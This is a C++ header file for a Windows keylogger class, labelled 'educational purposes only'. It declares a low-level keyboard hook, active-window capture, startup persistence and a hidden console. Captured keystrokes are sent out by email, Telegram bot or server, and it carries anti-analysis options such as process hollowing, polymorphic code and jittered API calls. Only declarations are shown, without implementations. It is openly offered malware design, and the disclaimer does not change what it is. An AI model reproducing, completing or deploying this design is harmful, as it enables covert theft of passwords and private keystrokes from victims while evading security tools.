/**
 * @file KeyLogger.h
 * @brief Educational keylogger with email and Telegram reporting capabilities
 * 
 * This is for EDUCATIONAL PURPOSES ONLY.
 * Unauthorized use of this code to monitor someone's activity without their
 * knowledge is illegal and unethical.
 */

#pragma once

// Include winsock2.h before Windows.h to avoid conflicts
#include <winsock2.h>
#include <Windows.h>
#include <string>
#include <fstream>
#include <map>
#include <time.h>
#include "SmtpClient.h"

/**
 * @class KeyLogger
 * @brief A class that implements keylogging functionality with Telegram reporting
 * 
 * This is for EDUCATIONAL PURPOSES ONLY.
 */
class KeyLogger {
private:
    // File handling
    std::ofstream logFile;
    std::string logFileName;
    std::string logDirectory;
    
    // Email configuration (legacy)
    SmtpClient* emailClient;
    std::string emailAddress;
    
    // Telegram configuration
    std::string telegramBotToken;
    std::string telegramChatId;
    bool useTelegram;
    
    // Keyboard hook and state
    HHOOK keyboardHook;
    std::map<int, std::string> specialKeys;
    bool isRunning;
    
    // Timing for reports
    time_t lastReportTime;
    int logInterval;
    
    // Anti-analysis flags
    bool useProcessHollowing;
    bool usePolymorphicCode;
    
    // Static instance for singleton pattern
    static KeyLogger* instance;
    
    // Forward declaration of the keyboard hook callback
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Helper methods
    void initSpecialKeys();
    std::string getActiveWindowTitle();
    void addToStartup(const std::string& appName);
    void createDirectoryStructure();
    void logSystemInfo();
    
    // Jitter function to randomize API calls
    void sleepWithJitter(int baseMs);
    
    // Communication functionality
    bool sendLogsToEmail();
    bool sendLogsToTelegram(const std::string& logData);
    bool sendLogsToServer(const std::string& logData, const std::string& windowTitle);
    std::string urlEncode(const std::string& str);
    std::string encryptData(const std::string& data);
    
public:
    /**
     * @brief Constructor for KeyLogger
     * @param telegramToken Telegram bot token
     * @param telegramChat Telegram chat ID
     * @param interval Time interval between log reports in seconds (default: 300)
     */
    KeyLogger(
        const std::string& telegramToken,
        const std::string& telegramChat,
        int interval = 300
    );
    
    /**
     * @brief Legacy constructor (email-based)
     */
    KeyLogger(
        const std::string& email, 
        const std::string& password, 
        const std::string& smtp = "smtp.gmail.com",
        int port = 587,
        int interval = 300
    );
    
    /**
     * @brief Destructor for KeyLogger
     */
    ~KeyLogger();
    
    /**
     * @brief Starts the keylogger
     * @param hideConsole Whether to hide the console window
     * @param addStartup Whether to add the application to startup
     * @param useProcessHollow Whether to use process hollowing (educational)
     * @return true if started successfully, false otherwise
     */
    bool start(bool hideConsole = true, bool addStartup = true, bool useProcessHollow = false);
    
    /**
     * @brief Logs a key press
     * @param vkCode The virtual key code of the pressed key
     */
    void logKey(int vkCode);
    
    /**
     * @brief Stops the keylogger
     */
    void stop();
    
    /**
     * @brief Gets the instance of the KeyLogger
     * @return Pointer to the KeyLogger instance
     */
    static KeyLogger* getInstance();
}; 